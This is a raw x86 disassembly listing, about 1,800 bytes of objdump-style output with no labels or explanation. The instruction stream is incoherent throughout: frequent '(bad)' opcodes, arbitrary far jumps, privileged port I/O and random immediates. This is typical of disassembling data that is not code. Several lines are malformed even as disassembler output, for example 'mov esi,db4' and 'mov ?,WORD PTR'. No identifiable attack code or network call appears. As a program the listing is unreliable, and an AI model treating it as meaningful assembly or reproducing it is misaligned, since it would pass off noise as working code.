  41d15c:	or     al,0xf5
  41d15e:	jmp    0x9cb4:0xe3fc5c63
  41d165:	sub    dh,BYTE PTR [ebp+0x7ba1cbea]
  41d16b:	xchg   edx,eax
  41d16c:	xor    al,0x54
  41d16e:	lds    ecx,FWORD PTR [edi+0x19a9abca]
  41d174:	fist   WORD PTR [ecx+0x5d]
  41d177:	adc    eax,0xbcd3a487
  41d17c:	mov    esi,edx
  41d17e:	(bad)  
  41d17f:	(bad)  
  41d180:	or     BYTE PTR [ebp-0x2223472],bl
  41d186:	pusha  
  41d187:	enter  0x93fa,0x7b
  41d18b:	call   0x88:0xbd1d51e1
  41d192:	push   edi
  41d193:	inc    ebx
  41d194:	mov    edx,0xa146e31a
  41d199:	in     al,dx
  41d19a:	adc    BYTE PTR [edi+0x7f],bh
  41d19d:	jge    0x41d187
  41d19f:	fisttp QWORD PTR [esi+0x10]
  41d1a2:	pop    ebx
  41d1a3:	sub    BYTE PTR [eax+0x21],0xb8
  41d1a7:	loopne 0x41d1ba
  41d1a9:	sub    BYTE PTR [esi],al
  41d1ab:	aas    
  41d1ac:	pop    ebp
  41d1ad:	in     al,0xe5
  41d1af:	das    
  41d1b0:	clc    
  41d1b1:	test   DWORD PTR [edi+0x50],edx
  41d1b4:	push   ecx
  41d1b5:	cmp    DWORD PTR [ebp-0x75],edi
  41d1b8:	add    DWORD PTR [esi],esp
  41d1ba:	push   esi
  41d1bb:	fnsave [esi]
  41d1bd:	in     eax,0x9a
  41d1bf:	adc    edi,eax
  41d1c1:	adc    eax,0xb3560eba
  41d1c6:	stos   BYTE PTR es:[edi],al
  41d1c7:	pop    ebp
  41d1c8:	dec    eax
  41d1c9:	pop    esp
  41d1ca:	push   edi
  41d1cb:	pushf  
  41d1cc:	xor    al,dl
  41d1ce:	je     0x41d1ec
  41d1d0:	sub    al,0xa7
  41d1d2:	loop   0x41d1d7
  41d1d4:	mov    ch,0x91
  41d1d6:	sub    edi,DWORD PTR [ebx+esi*2]
  41d1d9:	mov    eax,0xf1b9d2
  41d1de:	out    0xe3,al
  41d1e0:	mov    ecx,0xc34ecb6d
  41d1e5:	stos   BYTE PTR es:[edi],al
  41d1e6:	mov    edx,0xd050d5a
  41d1eb:	in     al,dx
  41d1ec:	mov    edx,0xeb74958
  41d1f1:	xor    bh,ah
  41d1f3:	out    0xff,eax
  41d1f5:	push   edx
  41d1f6:	inc    edx
  41d1f7:	sub    bl,cl
  41d1f9:	dec    esp
  41d1fa:	ficomp DWORD PTR [eax]
  41d1fc:	jb     0x41d203
  41d1fe:	int3   
  41d1ff:	in     al,dx
  41d200:	mov    eax,0xa61d8d2d
  41d205:	add    al,0xb7
  41d207:	ror    edx,0xc2
  41d20a:	mov    BYTE PTR [ebx+ebp*2],dl
  41d20d:	in     eax,dx
  41d20e:	in     eax,dx
  41d20f:	out    0xe8,al
  41d211:	fwait
  41d212:	daa    
  41d213:	mov    eax,ds:0x6d33177e
  41d218:	mov    dh,0x18
  41d21a:	cmp    BYTE PTR [edi+0x55],cl
  41d21d:	adc    al,0x39
  41d21f:	das    
  41d220:	mov    bh,0xff
  41d222:	cmp    DWORD PTR [edx],0xffffffc5
  41d225:	call   0xbaa7b4b5
  41d22a:	les    eax,FWORD PTR [ebp-0x22776129]
  41d230:	pusha  
  41d231:	jne    0x41d27c
  41d233:	dec    esi
  41d234:	fwait
  41d235:	mov    al,0x83
  41d237:	push   ebp
  41d238:	adc    ch,ch
  41d23a:	popf   
  41d23b:	lea    edx,[ebp+edi*4+0x19d4ec36]
  41d242:	mul    BYTE PTR [esi+esi*4]
  41d245:	(bad)  
  41d246:	push   esi
  41d247:	fwait
  41d248:	inc    ebx
  41d249:	cmp    eax,DWORD PTR [edx-0x17]
  41d24c:	inc    ebx
  41d24d:	fwait
  41d24e:	jb     0x41d1f6
  41d250:	pop    ss
  41d251:	pop    edi
  41d252:	lahf   
  41d253:	xchg   ebx,eax
  41d254:	jl     0x41d237
  41d256:	xchg   BYTE PTR [esp+ebx*8-0x2cc00386],al
  41d25d:	adc    BYTE PTR [esi],dl
  41d25f:	test   al,0xb2
  41d261:	add    al,0x67
  41d263:	mov    ss,WORD PTR [eax+0x14]
  41d266:	pop    ecx
  41d267:	mov    ch,0x7d
  41d269:	bswap  ecx
  41d26b:	iret   
  41d26c:	(bad)  
  41d26d:	(bad)  
  41d26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d26f:	jle    0x41d230
  41d271:	mov    dh,0xd4
  41d273:	dec    esi
  41d274:	mov    esi,0xfa583a49
  41d279:	or     bh,bl
  41d27b:	(bad)  
  41d27c:	dec    eax
  41d27d:	mov    eax,ds:0x2206d1b2
  41d282:	add    al,0x5
  41d284:	fcmovb st,st(1)
  41d286:	daa    
  41d287:	and    ecx,DWORD PTR [edx+eax*4+0x433f82f]
  41d28e:	out    dx,eax
  41d28f:	lds    eax,FWORD PTR [eax]
  41d291:	push   eax
  41d292:	add    eax,0x107f14d9
  41d297:	ror    BYTE PTR [edx],0xb5
  41d29a:	dec    esp
  41d29b:	ds jns 0x41d2ce
  41d29e:	mov    WORD PTR [edi-0x423f5f4c],ss
  41d2a4:	in     al,dx
  41d2a5:	cmp    ah,dh
  41d2a7:	xor    eax,edx
  41d2a9:	sub    DWORD PTR [esi],eax
  41d2ab:	je     0x41d2bf
  41d2ad:	dec    ebp
  41d2ae:	pop    edx
  41d2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2b0:	sar    BYTE PTR [ebp-0x66dc157e],1
  41d2b6:	fwait
  41d2b7:	push   edi
  41d2b8:	in     eax,dx
  41d2b9:	cmc    
  41d2ba:	outs   dx,BYTE PTR ds:[esi]
  41d2bb:	xor    al,0xaf
  41d2bd:	jns    0x41d2cb
  41d2bf:	cmp    al,0xf3
  41d2c1:	je     0x41d269
  41d2c3:	popf   
  41d2c4:	iret   
  41d2c5:	popa   
  41d2c6:	sbb    edi,DWORD PTR [edi]
  41d2c8:	or     al,0x33
  41d2ca:	jo     0x41d301
  41d2cc:	shr    BYTE PTR [eax+esi*1-0x10a45249],0xd9
  41d2d4:	dec    ebp
  41d2d5:	cld    
  41d2d6:	mov    esp,ecx
  41d2d8:	dec    esp
  41d2d9:	push   ss
  41d2da:	hlt    
  41d2db:	test   DWORD PTR [eax-0x42cef0da],ecx
  41d2e1:	lds    esp,FWORD PTR [eax+0x7d]
  41d2e4:	cwde   
  41d2e5:	mov    WORD PTR [edx],es
  41d2e7:	invd   
  41d2e9:	emms   
  41d2eb:	je     0x41d2d9
  41d2ed:	cmp    BYTE PTR cs:[ecx+0x46689149],0x65
  41d2f5:	inc    edx
  41d2f6:	cmp    eax,0x45beb925
  41d2fb:	and    esi,eax
  41d2fd:	loopne 0x41d31b
  41d2ff:	addr16 dec edi
  41d301:	popf   
  41d302:	rcr    DWORD PTR [esi-0x6f],0x1f
  41d306:	mov    ds:0x9d4fa649,eax
  41d30b:	mov    ebp,edi
  41d30d:	rcr    edx,1
  41d30f:	push   ebx
  41d310:	daa    
  41d311:	push   ecx
  41d312:	jle    0x41d2b4
  41d314:	fild   DWORD PTR [edi+ebp*8]
  41d317:	cmp    cl,BYTE PTR [ebx+0x712e458f]
  41d31d:	dec    esp
  41d31e:	pop    ebp
  41d31f:	fidiv  DWORD PTR [edi+0x7b]
  41d322:	psrld  mm5,QWORD PTR [edi+ebp*4+0x386c9860]
  41d32a:	or     BYTE PTR [ebp+0x7ffca242],ch
  41d330:	cmp    DWORD PTR [edx],0x1ba4f07c
  41d336:	push   ebx
  41d337:	out    dx,eax
  41d338:	outs   dx,BYTE PTR ds:[esi]
  41d339:	aas    
  41d33a:	push   0x7ab6792d
  41d33f:	xor    esp,DWORD PTR ds:0xdf97327f
  41d345:	jmp    0x41d348
  41d347:	in     eax,0xa8
  41d349:	sar    BYTE PTR [edi],0x32
  41d34c:	push   ebx
  41d34d:	mov    ebp,ds
  41d34f:	mov    DWORD PTR ds:0x7a14c0c4,ecx
  41d355:	jmp    0x81ed04ac
  41d35a:	push   cs
  41d35b:	addr16 leave 
  41d35d:	jmp    0x3c:0x244b0e70
  41d364:	out    dx,al
  41d365:	out    0x98,al
  41d367:	int    0x12
  41d369:	(bad)  
  41d36a:	jecxz  0x41d303
  41d36c:	and    DWORD PTR [ecx+esi*4],ebx
  41d36f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d370:	adc    eax,0x2688dd18
  41d375:	dec    ebp
  41d376:	cmp    al,BYTE PTR [edi-0x6d]
  41d379:	aas    
  41d37a:	cwde   
  41d37b:	lahf   
  41d37c:	gs mov bl,0x52
  41d37f:	call   0x3de8:0x8dc24650
  41d386:	icebp  
  41d387:	ds inc ecx
  41d389:	xlat   BYTE PTR es:[ebx]
  41d38b:	out    dx,al
  41d38c:	inc    ebp
  41d38d:	pop    ss
  41d38e:	add    edx,DWORD PTR [ebx+edx*8]
  41d391:	lds    esi,FWORD PTR [ebx]
  41d393:	lock add al,0x8a
  41d396:	sub    BYTE PTR [edi],0x1
  41d399:	jge    0x41d400
  41d39b:	aas    
  41d39c:	in     al,dx
  41d39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d39e:	adc    eax,0xbe604d72
  41d3a3:	inc    eax
  41d3a4:	cld    
  41d3a5:	dec    ecx
  41d3a6:	mov    ch,ah
  41d3a8:	aad    0x57
  41d3aa:	sbb    DWORD PTR [ebp-0x7f7750bc],ecx
  41d3b0:	in     al,0xb0
  41d3b2:	mov    DWORD PTR [ebp+0x6b],0xd62d82f
  41d3b9:	test   eax,0x248c1b7a
  41d3be:	(bad)  
  41d3bf:	jp     0x41d3ca
  41d3c1:	xchg   esp,eax
  41d3c2:	mov    dl,BYTE PTR [edi+0x77]
  41d3c5:	(bad)
  41d3c8:	loop   0x41d3da
  41d3ca:	dec    edi
  41d3cb:	pop    DWORD PTR [ebx]
  41d3cd:	pusha  
  41d3ce:	out    0xff,al
  41d3d0:	cli    
  41d3d1:	lahf   
  41d3d2:	dec    ecx
  41d3d3:	addr16 push si
  41d3d6:	fnstsw WORD PTR [ebp+0x44]
  41d3d9:	push   ebp
  41d3da:	jmp    0x528729fe
  41d3df:	outs   dx,DWORD PTR ds:[esi]
  41d3e0:	push   es
  41d3e1:	jl     0x41d3cb
  41d3e3:	int    0x8c
  41d3e5:	sti    
  41d3e6:	(bad)  
  41d3e7:	xchg   edi,eax
  41d3e8:	jo     0x41d421
  41d3ea:	and    DWORD PTR [ecx+eax*2+0x53db773a],ebx
  41d3f1:	push   edx
  41d3f2:	imul   ebx,DWORD PTR [ebx+ebx*8],0xffffffb3
  41d3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3f7:	mov    gs,WORD PTR [eax]
  41d3f9:	adc    BYTE PTR [eax+ebx*4],cl
  41d3fc:	mov    dl,0x99
  41d3fe:	jg     0x41d399
  41d400:	loopne 0x41d43d
  41d402:	leave  
  41d403:	fwait
  41d404:	mov    BYTE PTR [ebp+0x65],bl
  41d407:	jle    0x41d475
  41d409:	mov    eax,0x64903055
  41d40e:	sub    esp,DWORD PTR [ecx-0x36]
  41d411:	or     eax,0x2f464843
  41d416:	fisttp DWORD PTR [esi-0x6f]
  41d419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d41a:	int    0xdb
  41d41c:	xchg   ebx,eax
  41d41d:	loopne 0x41d3a1
  41d41f:	pop    ebp
  41d420:	mov    gs:0x172ab6d6,al
  41d426:	fs xchg ebx,eax
  41d428:	fisubr DWORD PTR [edx-0x71520565]
  41d42e:	pop    es
  41d42f:	mov    eax,ds:0x4587dc6c
  41d434:	out    dx,eax
  41d435:	addr16 aad 0xdd
  41d438:	aas    
  41d439:	add    edi,esi
  41d43b:	cmc    
  41d43c:	(bad)  
  41d43d:	or     eax,0x5f699f1d
  41d442:	inc    ebp
  41d443:	xchg   BYTE PTR [ebx+ebx*4-0x10],dh
  41d447:	out    0xe9,al
  41d449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d44a:	fisub  DWORD PTR [edx]
  41d44c:	(bad)  [edx-0x1dfec5d8]
  41d452:	mov    ds:0x28fd52ae,al
  41d457:	loope  0x41d402
  41d459:	jns    0x41d43a
  41d45b:	pop    ds
  41d45c:	cmp    ch,ch
  41d45e:	push   cs
  41d45f:	adc    DWORD PTR [ebp+ebx*4+0x4c],0x25
  41d464:	aas    
  41d465:	and    dl,bl
  41d467:	or     al,0xfd
  41d469:	and    al,0xf8
  41d46b:	push   0x7ac845df
  41d470:	cmc    
  41d471:	test   al,0x7c
  41d473:	jb     0x41d41d
  41d475:	(bad)  
  41d476:	pop    ds
  41d477:	dec    ecx
  41d478:	mov    WORD PTR [ebp+ecx*1-0x43],ds
  41d47c:	es and ah,dh
  41d47f:	xlat   BYTE PTR ds:[ebx]
  41d480:	lea    ebx,[ebp+0x7c]
  41d483:	jns    0x41d4fe
  41d485:	xchg   esp,eax
  41d486:	cld    
  41d487:	out    0xe6,eax
  41d489:	mov    esi,0xae8b2a59
  41d48e:	in     eax,dx
  41d48f:	(bad)  
  41d490:	loop   0x41d43f
  41d492:	mov    ds:0x52a67176,al
  41d497:	mul    BYTE PTR [ecx]
  41d499:	push   es
  41d49a:	enter  0x153b,0x3e
  41d49e:	fadd   st,st(0)
  41d4a0:	jg     0x41d49e
  41d4a2:	pop    ebx
  41d4a3:	(bad)  
  41d4a4:	in     eax,dx
  41d4a5:	mov    ch,0x2e
  41d4a7:	(bad)  
  41d4a8:	hlt    
  41d4a9:	outs   dx,DWORD PTR ds:[esi]
  41d4aa:	jmp    0xa311c6c0
  41d4af:	add    ecx,DWORD PTR [ebx+0x5d5a9b8c]
  41d4b5:	cmc    
  41d4b6:	jo     0x41d482
  41d4b8:	hlt    
  41d4b9:	mov    ch,0xfc
  41d4bb:	repnz cmp cl,dh
  41d4be:	mov    DWORD PTR [ebx+0x7c],eax
  41d4c1:	in     al,0xc0
  41d4c3:	pmaxub mm2,mm0
  41d4c6:	or     BYTE PTR [edi+edi*2-0x27],0xb8
  41d4cb:	cmp    eax,0x2f88533d
  41d4d0:	sub    ebp,DWORD PTR [edx]
  41d4d2:	mov    eax,ds:0xd916523b
  41d4d7:	add    BYTE PTR [ecx],bh
  41d4d9:	mov    esi,DWORD PTR [ebx-0x54]
  41d4dc:	bswap  eax
  41d4de:	mov    eax,ds:0xb2ed10d1
  41d4e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4e4:	sbb    eax,0x8de5c117
  41d4e9:	jns    0x41d489
  41d4eb:	mov    ?,WORD PTR [esi]
  41d4ed:	and    esp,edx
  41d4ef:	xchg   esp,eax
  41d4f0:	xchg   ebx,ecx
  41d4f2:	je     0x41d530
  41d4f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4f5:	into   
  41d4f6:	pop    edx
  41d4f7:	stos   DWORD PTR es:[edi],eax
  41d4f8:	push   eax
  41d4f9:	dec    ebp
  41d4fa:	icebp  
  41d4fb:	jl     0x41d53d
  41d4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4fe:	push   ds
  41d4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d500:	jl     0x41d56d
  41d502:	shr    ecx,0x11
  41d505:	xor    al,0x8
  41d507:	rcr    BYTE PTR [ebx-0x3c361910],cl
  41d50d:	sub    ah,BYTE PTR [esi]
  41d50f:	pop    edi
  41d510:	mov    edi,0xf6cb08aa
  41d515:	xchg   ebp,eax
  41d516:	inc    ebx
  41d517:	push   cs
  41d518:	mov    ds:0x1400b082,eax
  41d51d:	cdq    
  41d51e:	neg    BYTE PTR [ebp+0xd]
  41d521:	loope  0x41d4e0
  41d523:	xor    eax,0x7a9afb01
  41d528:	mov    WORD PTR [edx-0x7e],ds
  41d52b:	adc    ch,ah
  41d52d:	mov    ds:0x37d64a2,eax
  41d532:	icebp  
  41d533:	mov    DWORD PTR gs:[ecx+esi*2+0x52],0xf9cd4c64
  41d53c:	xor    BYTE PTR ds:0xb5ae6c4f,0x26
  41d543:	(bad)  
  41d544:	jecxz  0x41d582
  41d546:	jmp    0x41d4eb
  41d548:	mov    esp,0x464ba62b
  41d54d:	jmp    DWORD PTR [edi]
  41d54f:	mov    ebp,0xc5856fc0
  41d554:	add    eax,0x3031a240
  41d559:	sub    eax,0xc18e5786
  41d55e:	add    al,0xc2
  41d560:	sti    
  41d561:	sbb    bl,dl
  41d563:	call   0x8b0964d0
  41d568:	mov    bh,0xd7
  41d56a:	push   edx
  41d56b:	rol    DWORD PTR [esi],1
  41d56d:	mov    bl,0x67
  41d56f:	test   BYTE PTR [esi-0x46],dl
  41d572:	loop   0x41d5a3
  41d574:	sub    bh,dh
  41d576:	jae    0x41d557
  41d578:	sar    BYTE PTR [edi+0x6ff9abee],0x18
  41d57f:	inc    eax
  41d580:	popf   
  41d581:	xchg   ebp,eax
  41d582:	inc    esp
  41d583:	ss mov dh,0x36
  41d586:	jl     0x41d5e9
  41d588:	clc    
  41d589:	mov    esp,DWORD PTR [ebx+0x3794795b]
  41d58f:	xchg   esi,eax
  41d590:	rol    DWORD PTR [edi-0x4ef49a10],1
  41d596:	sub    eax,0xe446c442
  41d59b:	push   eax
  41d59c:	test   DWORD PTR [esi+0xf24c988],ebp
  41d5a2:	sti    
  41d5a3:	les    ecx,FWORD PTR [edi+0x34]
  41d5a6:	or     al,0x76
  41d5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5a9:	mov    ah,bh
  41d5ab:	iret   
  41d5ac:	sahf   
  41d5ad:	inc    ebx
  41d5ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5af:	sahf   
  41d5b0:	pop    esi
  41d5b1:	or     DWORD PTR [eax],ecx
  41d5b3:	adc    dh,ch
  41d5b5:	sbb    dh,BYTE PTR [edx-0xbe90e6a]
  41d5bb:	dec    edx
  41d5bc:	jl     0x41d53e
  41d5be:	and    DWORD PTR ds:0xba2223dc,ecx
  41d5c4:	pusha  
  41d5c5:	dec    ecx
  41d5c6:	fnstenv [edx+ecx*1-0x18]
  41d5ca:	rol    ecx,cl
  41d5cc:	push   esp
  41d5cd:	cmp    BYTE PTR [edi+ecx*8+0x65c9dc56],dl
  41d5d4:	test   BYTE PTR [ecx-0x578d9611],0x53
  41d5db:	xor    eax,0xe019274b
  41d5e0:	sub    edx,ecx
  41d5e2:	inc    ebx
  41d5e3:	push   cs
  41d5e4:	fnstcw WORD PTR [edi]
  41d5e6:	repnz sti 
  41d5e8:	xor    esp,esp
  41d5ea:	ss push ecx
  41d5ec:	in     eax,dx
  41d5ed:	inc    edi
  41d5ee:	das    
  41d5ef:	inc    edi
  41d5f0:	add    al,0x8
  41d5f2:	fisttp WORD PTR [ebp+0x71f9f700]
  41d5f8:	mov    al,bh
  41d5fa:	jecxz  0x41d5bc
  41d5fc:	popf   
  41d5fd:	mov    ecx,DWORD PTR [eax-0x69]
  41d600:	lea    ecx,ds:0x93e5a22b
  41d606:	mov    cl,0x3e
  41d608:	pop    esi
  41d609:	xchg   BYTE PTR [ebx],al
  41d60b:	dec    eax
  41d60c:	jge    0x41d5de
  41d60e:	xor    BYTE PTR [ebp+0x311b7235],0xd1
  41d615:	scas   eax,DWORD PTR es:[edi]
  41d616:	out    dx,eax
  41d617:	lea    esp,[esi+eax*8]
  41d61a:	iret   
  41d61b:	mov    ebp,DWORD PTR [ebx+eax*4+0x2f8247ee]
  41d622:	add    esi,eax
  41d624:	repnz inc esp
  41d626:	cmp    DWORD PTR [ecx],eax
  41d628:	sub    eax,0xcf6974d1
  41d62d:	adc    ah,ah
  41d62f:	mov    ebp,0x84cc7732
  41d634:	jne    0x41d699
  41d636:	inc    ecx
  41d637:	sub    eax,0xf3af260e
  41d63c:	icebp  
  41d63d:	(bad)  
  41d63e:	dec    edx
  41d63f:	push   eax
  41d640:	enter  0xb75a,0x36
  41d644:	out    0xd3,eax
  41d646:	sti    
  41d647:	outs   dx,BYTE PTR ds:[esi]
  41d648:	xor    ah,al
  41d64a:	inc    edi
  41d64b:	jns    0x41d6c3
  41d64d:	ds xor eax,0x57887a66
  41d653:	pop    edi
  41d654:	inc    edx
  41d655:	or     BYTE PTR [ebp+0x62a8063b],bl
  41d65b:	(bad)  
  41d65c:	jbe    0x41d6a9
  41d65e:	mov    edx,0x3a44f070
  41d663:	sbb    BYTE PTR ds:0x5ee2906c,ch
  41d669:	in     al,dx
  41d66a:	fs adc al,0xea
  41d66d:	or     DWORD PTR [eax],0x7f04de11
  41d673:	out    0xf9,al
  41d675:	pop    eax
  41d676:	ja     0x41d6ad
  41d678:	sub    BYTE PTR fs:[ebx],0xd
  41d67c:	idiv   DWORD PTR [ecx+0x1a]
  41d67f:	inc    DWORD PTR [esi+0x744aa7bd]
  41d685:	outs   dx,DWORD PTR ds:[esi]
  41d686:	fcomp  QWORD PTR [edi+0x50]
  41d689:	pushf  
  41d68a:	mov    esi,db4
  41d68d:	or     edx,DWORD PTR [esi-0x66d32396]
  41d693:	inc    edx
  41d694:	lods   al,BYTE PTR ds:[esi]
  41d695:	and    DWORD PTR [ebx+0x125c4e7b],eax
  41d69b:	stos   DWORD PTR es:[edi],eax
  41d69c:	rcl    DWORD PTR [eax+0x5bd26ff4],0x3d
  41d6a3:	mov    ebp,0xaffc0389
  41d6a8:	rcl    DWORD PTR [esi+edx*2-0x33],cl
  41d6ac:	xor    al,0x11
  41d6ae:	nop
  41d6af:	xlat   BYTE PTR ds:[ebx]
  41d6b0:	pop    DWORD PTR [ecx-0x2c]
  41d6b3:	mov    WORD PTR [ebx],gs
  41d6b5:	js     0x41d693
  41d6b7:	pop    edx
  41d6b8:	sbb    esp,DWORD PTR [edi+0x7d3c0d96]
  41d6be:	mov    bl,0x38
  41d6c0:	inc    esp
  41d6c1:	mov    cl,0xa6
  41d6c3:	inc    ebp
  41d6c4:	xlat   BYTE PTR es:[ebx]
  41d6c6:	nop
  41d6c7:	and    al,0xbe
  41d6c9:	(bad)  
  41d6cb:	out    0xf1,eax
  41d6cd:	xchg   DWORD PTR [edx-0x54e8f5e7],esi
  41d6d3:	lds    esp,FWORD PTR [esi+ecx*2]
  41d6d6:	jo     0x41d6bf
  41d6d8:	lea    edi,[ecx]
  41d6da:	sbb    eax,0x420a16b5
  41d6df:	sub    edx,DWORD PTR [edi-0x6e8b9155]
  41d6e5:	cdq    
  41d6e6:	fdiv   st,st(3)
  41d6e8:	scas   al,BYTE PTR es:[edi]
  41d6e9:	sti    
  41d6ea:	dec    ebp
  41d6eb:	mov    ecx,0x92a04339
  41d6f0:	push   edi
  41d6f1:	int    0xa3
  41d6f3:	in     al,dx
  41d6f4:	push   0x194f11bf
  41d6f9:	fwait
  41d6fa:	mov    cl,0x5d
  41d6fc:	fild   WORD PTR [eax-0x37a9d249]
  41d702:	cwde   
  41d703:	push   edx
  41d704:	adc    cl,BYTE PTR [eax]
  41d706:	sub    ecx,DWORD PTR [ecx*8-0x22aed6a4]
  41d70d:	cs dec ebp
  41d70f:	ret    0x7ed2
  41d712:	mov    ?,WORD PTR [edi+0x2c]
  41d715:	adc    al,ah
  41d717:	arpl   WORD PTR [esi-0x57],ax
  41d71a:	dec    eax
  41d71b:	cld    
  41d71c:	jp     0x41d70f
  41d71e:	xchg   ebp,eax
  41d71f:	sub    eax,0xeba083ea
  41d724:	je     0x41d6df
  41d726:	in     al,0xa2
  41d728:	add    esi,DWORD PTR [edi+0x4d]
  41d72b:	add    esp,ecx
  41d72d:	and    al,0xb4
  41d72f:	in     al,dx
  41d730:	sar    BYTE PTR [ecx-0x748b8193],1
  41d736:	test   DWORD PTR [esi-0x3d],esp
  41d739:	cmp    DWORD PTR [ecx-0xc],esp
  41d73c:	and    esp,DWORD PTR ds:0x41f081de
  41d742:	and    eax,0x86890c11
  41d747:	cmc    
  41d748:	scas   al,BYTE PTR es:[edi]
  41d749:	push   ds
  41d74a:	sbb    eax,0xf28b7cc2
  41d74f:	scas   al,BYTE PTR es:[edi]
  41d750:	add    esi,DWORD PTR [edi-0x70c297c3]
  41d756:	js     0x41d720
  41d758:	cwde   
  41d759:	add    bl,BYTE PTR [eax+0xb]
  41d75c:	add    BYTE PTR [edi],al
  41d75e:	and    al,0x6c
  41d760:	cli    
  41d761:	pop    ebx
  41d762:	(bad)  
  41d763:	out    dx,al
  41d764:	outs   dx,BYTE PTR ds:[esi]
  41d765:	sub    DWORD PTR [esi-0x24],edx
  41d768:	out    dx,al
  41d769:	call   0x1a0c8cbc
  41d76e:	dec    esi
  41d76f:	gs sbb dl,bh
  41d772:	es pushf 
  41d774:	jae    0x41d770
  41d776:	cmc    
  41d777:	mov    ebp,0xa7a4bd93
  41d77c:	xchg   esi,eax
  41d77d:	sbb    edx,0xe240cb6a
  41d783:	dec    esi
  41d784:	mov    esp,0x4b21831b
  41d789:	or     esi,DWORD PTR [edx-0x549dd11b]
  41d78f:	adc    ah,bh
  41d791:	push   es
  41d792:	xchg   edx,eax
  41d793:	or     bl,BYTE PTR [ecx+0x37]
  41d796:	mov    ds:0x10cce712,al
  41d79b:	lahf   
  41d79c:	xchg   ecx,eax
  41d79d:	mov    dh,0x1a
  41d79f:	adc    BYTE PTR [ebx-0x43],ch
  41d7a2:	pop    esp
  41d7a3:	pop    edi
  41d7a4:	cld    
  41d7a5:	shl    al,cl
  41d7a7:	dec    esi
  41d7a8:	sub    eax,0xa3395e8d
  41d7ad:	cmp    eax,0xf217339e
  41d7b2:	pop    ds
  41d7b3:	imul   esp,DWORD PTR [edi],0x89394e0d
  41d7b9:	jp     0x41d7df
  41d7bb:	adc    bh,BYTE PTR [esi+0x4e5c74f6]
  41d7c1:	fwait
  41d7c2:	add    eax,0x82151fa3
  41d7c7:	test   BYTE PTR [esi],cl
  41d7c9:	ins    DWORD PTR es:[edi],dx
  41d7ca:	jmp    0x6a32:0x3409b32b
  41d7d1:	mov    bh,0x49
  41d7d3:	xor    eax,0x8d05ff74
  41d7d8:	mov    WORD PTR [edi-0x44],?
  41d7db:	jg     0x41d7e7
  41d7dd:	mov    cl,0xdb
  41d7df:	popf   
  41d7e0:	inc    esp
  41d7e1:	mov    ecx,0xbca922ae
  41d7e6:	dec    esi
  41d7e7:	mov    ebp,0x93e21527
  41d7ec:	retf   0xa45e
  41d7ef:	jne    0x41d812
  41d7f1:	jb     0x41d7a8
  41d7f3:	inc    esp
  41d7f4:	mov    al,0x24
  41d7f6:	push   ebx
  41d7f7:	jbe    0x41d797
  41d7f9:	mov    esi,0x699a2963
  41d7fe:	dec    ecx
  41d7ff:	mov    edx,0x16c89161
  41d805:	jbe    0x41d7f7
  41d807:	cmp    BYTE PTR [ecx-0x77],ch
  41d80a:	imul   ebx
  41d80c:	mov    esp,0x52e733da
  41d811:	pusha  
  41d812:	rol    BYTE PTR [edx-0x24],cl
  41d815:	dec    ebp
  41d816:	cli    
  41d817:	jle    0x41d7ec
  41d819:	call   0xfdbb:0x2ab4deda
  41d820:	lds    ecx,FWORD PTR [eax+0x66f700c0]
  41d826:	sahf   
  41d827:	cli    
  41d828:	neg    DWORD PTR [ebx]
  41d82a:	sbb    ecx,DWORD PTR ds:0x7498f25a
  41d830:	sub    al,0xcb
  41d832:	mov    cl,0xd4
  41d834:	lds    esp,FWORD PTR [eax]
  41d836:	lods   eax,DWORD PTR ds:[esi]
  41d837:	(bad)  
  41d838:	push   ecx
  41d839:	sub    eax,edi
  41d83b:	push   ebx
  41d83c:	push   0x4563e849
  41d841:	enter  0x2392,0x95
  41d845:	rol    BYTE PTR gs:[esp+ebp*2-0x4a],0x33
  41d84b:	daa    
  41d84c:	in     al,0x49
  41d84e:	adc    BYTE PTR [esi+0x2d],dh
  41d851:	jle    0x41d816
  41d853:	fidiv  DWORD PTR [ebx]
  41d855:	aad    0x5c
  41d857:	xor    bl,0x26
  41d85a:	enter  0x1627,0x70
  41d85e:	cmp    al,0xbd
  41d860:	pop    eax
  41d861:	sti    
  41d862:	jp     0x41d860
  41d864:	cmp    DWORD PTR [edi],ecx
  41d866:	or     edi,esp
  41d868:	cli    
  41d869:	mov    DWORD PTR ds:0x1072c065,esp
  41d86f:	mov    dh,0xc9
  41d871:	inc    edx
  41d872:	out    0x33,eax
  41d874:	push   ds
  41d875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d877:	inc    esp
  41d878:	or     al,BYTE PTR [edx]
  41d87a:	hlt    
  41d87b:	out    dx,al
  41d87c:	pop    es
  41d87d:	adc    ch,ah
  41d87f:	clc    
  41d880:	mov    al,ds:0x53f68107
  41d885:	mov    BYTE PTR [ecx],al
  41d887:	in     al,0x48
  41d889:	arpl   WORD PTR [edx],ax
  41d88b:	push   ds
  41d88c:	jecxz  0x41d8a3
  41d88e:	nop    ebp
  41d891:	lock (bad) 
  41d893:	jmp    0x8d08:0x57150a8f
  41d89a:	xor    DWORD PTR [eax-0x41efe22f],eax
  41d8a0:	sub    DWORD PTR [ecx-0x1a],esp
  41d8a3:	push   ss
  41d8a4:	jge    0x41d8f6
  41d8a6:	bound  ebp,QWORD PTR [edi-0x74]
  41d8a9:	mov    ds:0xb9b4432f,eax
  41d8ae:	dec    ebx
  41d8af:	rcr    DWORD PTR [esi+edi*4],cl
  41d8b2:	sti    
  41d8b3:	cmp    BYTE PTR gs:[edi-0x47],bl
  41d8b7:	pusha  
  41d8b8:	mov    edx,0xa4a21147
  41d8bd:	mov    cl,0xfb
  41d8bf:	jbe    0x41d87d
  41d8c1:	lods   eax,DWORD PTR ds:[esi]
  41d8c2:	add    al,0x55
